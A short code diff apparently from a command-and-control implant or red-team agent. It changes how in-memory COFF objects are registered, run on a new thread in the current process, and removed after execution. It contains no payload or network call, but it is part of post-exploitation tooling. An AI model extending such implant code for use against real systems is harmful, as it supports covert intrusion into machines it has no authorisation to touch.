@@ -235,23 +235,15 @@ namespace Memory {
             coff->coff_id       = UnpackUint32(&parser);
             coff->task_id       = Ctx->session.current_taskid;
 
-            if (!CreateUserThread(NtCurrentProcess(), true, (void*) CoffThread, coff, nullptr)) {
+            AddCoff(coff);
+
+            if (!CreateUserThread(NtCurrentProcess(), X64, (void*) CoffThread, coff, nullptr)) {
                 // LOG ERROR
                 return;
             }
 
-            if (coff->b_cache) {
-                AddCoff(coff);
-            }
-            else {
-                MemSet(coff->data, 0, coff->data_size);
-                MemSet(coff->args, 0, coff->args_size);
-                MemSet(coff->entrypoint, 0, coff->entrypoint_length);
-
-                Free(coff->data);
-                Free(coff->args);
-                Free(coff->entrypoint);
-                Free(coff);
+            if (!coff->b_cache) {
+                RemoveCoff(coff->coff_id);
             }
         }
     }
